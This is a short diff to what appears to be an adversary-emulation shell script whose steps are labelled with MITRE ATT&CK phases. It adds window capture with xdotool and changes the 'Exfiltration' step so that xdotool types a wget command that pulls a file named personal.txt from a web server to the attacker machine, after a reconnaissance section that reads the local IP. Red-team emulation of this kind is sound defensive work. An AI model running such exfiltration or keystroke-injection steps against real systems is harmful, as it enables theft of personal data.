@@ -15,6 +15,7 @@ int_to_ip4() {
 #################
 
 # Reconnaissance on network
+MAIN=`xdotool getactivewindow`
 ifconfig
 ATTACKER_IP=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
 PREFIX=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f2)
@@ -152,7 +153,7 @@ echo "############ Exfiltration ############"
 echo "============MITRE ATT&CK technique: Exfiltration Over Alternative Protocol============"
 echo "############ Transferring file to Attacker machine ############"
 xdotool windowactivate $MAIN
-gnome-terminal -- wget http://$WEB_IP/uploads/personal.txt
+xdotool type "wget http://$WEB_IP/uploads/personal.txt";xdotool key Return
 echo ""
 
 echo ""
